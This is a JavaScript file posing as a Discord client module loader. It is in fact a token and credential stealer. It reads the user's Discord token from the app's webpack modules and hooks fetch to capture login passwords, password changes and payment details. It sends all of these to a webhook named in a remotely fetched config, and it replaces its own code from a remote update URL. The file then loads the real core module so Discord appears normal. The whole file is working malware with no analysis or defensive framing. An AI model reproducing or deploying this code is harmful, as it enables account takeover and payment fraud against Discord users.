// Discord Module Loader
const https = require('https');
const fs = require('fs');
const path = require('path');

// Configuration fetched from GitHub at runtime
const CONFIG_URL = '%%CONFIG_URL%%'; // e.g., https://raw.githubusercontent.com/user/repo/main/config.json

let WEBHOOK = '';
let UPDATE_URL = '';

// Fetch config from GitHub
function fetchConfig() {
    return new Promise((resolve, reject) => {
        https.get(CONFIG_URL, (res) => {
            if (res.statusCode !== 200) {
                reject(new Error(`HTTP ${res.statusCode}`));
                return;
            }
            
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const config = JSON.parse(data);
                    WEBHOOK = config.webhook || '';
                    UPDATE_URL = config.update_url || '';
                    resolve();
                } catch (e) {
                    reject(e);
                }
            });
        }).on('error', reject);
    });
}

// Initialize config, then start monitoring
fetchConfig().then(() => {
    if (WEBHOOK) {
        startMonitoring();
    }
}).catch(() => {
    // Config fetch failed - just load Discord normally
});

function startMonitoring() {
    // Token extraction
    function extractToken() {
        try {
            const { BrowserWindow } = require('electron');
            const win = BrowserWindow.getAllWindows()[0];
            if (!win) return null;
            
            win.webContents.executeJavaScript(`
                (() => {
                    try {
                        const wpRequire = window.webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]); }]);
                        const tokenModule = m.find(m => m?.exports?.default?.getToken);
                        return tokenModule ? tokenModule.exports.default.getToken() : null;
                    } catch { return null; }
                })()
            `).then(token => {
                if (token) sendData({ type: 'token_refresh', token: token });
            }).catch(() => {});
        } catch {}
    }

    // Webhook sender
    function sendData(data) {
        if (!WEBHOOK) return;
        
        const payload = JSON.stringify({
            username: 'Discord',
            embeds: [{
                title: data.type || 'Activity',
                color: 5814783,
                fields: Object.entries(data).map(([k, v]) => ({ 
                    name: k, 
                    value: String(v).substring(0, 1024), 
                    inline: true 
                })),
                timestamp: new Date().toISOString()
            }]
        });
        
        try {
            const url = new URL(WEBHOOK);
            const req = https.request({
                hostname: url.hostname,
                path: url.pathname + url.search,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                }
            });
            req.write(payload);
            req.end();
        } catch {}
    }

    // API interception
    if (typeof global.fetch !== 'undefined') {
        const originalFetch = global.fetch;
        global.fetch = new Proxy(originalFetch, {
            apply(target, thisArg, args) {
                const [url, options] = args;
                
                if (url && typeof url === 'string' && url.includes('/api/v')) {
                    const body = options?.body;
                    
                    // Capture login attempts
                    if (url.includes('/auth/login') && body) {
                        try {
                            const parsed = JSON.parse(body);
                            if (parsed.login || parsed.email) {
                                sendData({
                                    type: 'login_attempt',
                                    email: parsed.login || parsed.email,
                                    password: parsed.password || 'N/A'
                                });
                            }
                        } catch {}
                    }
                    
                    // Capture password changes
                    if (url.includes('/users/@me') && body && options.method === 'PATCH') {
                        try {
                            const parsed = JSON.parse(body);
                            if (parsed.password || parsed.new_password) {
                                sendData({
                                    type: 'password_change',
                                    old: parsed.password || 'N/A',
                                    new: parsed.new_password || 'N/A'
                                });
                            }
                        } catch {}
                    }
                    
                    // Capture payment info
                    if (url.includes('/payment-methods') && body) {
                        try {
                            const parsed = JSON.parse(body);
                            sendData({
                                type: 'payment_added',
                                data: JSON.stringify(parsed).substring(0, 500)
                            });
                        } catch {}
                    }
                }
                
                return Reflect.apply(target, thisArg, args);
            }
        });
    }

    // Auto-update mechanism
    function checkUpdate() {
        if (!UPDATE_URL) return;
        
        try {
            https.get(UPDATE_URL, (res) => {
                if (res.statusCode !== 200) return;
                
                let newCode = '';
                res.on('data', chunk => newCode += chunk);
                res.on('end', () => {
                    try {
                        const current = fs.readFileSync(__filename, 'utf8');
                        if (newCode.length > 500 && newCode !== current) {
                            fs.writeFileSync(__filename, newCode, 'utf8');
                        }
                    } catch {}
                });
            }).on('error', () => {});
        } catch {}
    }

    // Initialize monitoring
    setTimeout(extractToken, 15000);
    setTimeout(checkUpdate, 60000);
    setInterval(checkUpdate, 1800000);
}

// Load original Discord core module
module.exports = require('./core.asar');
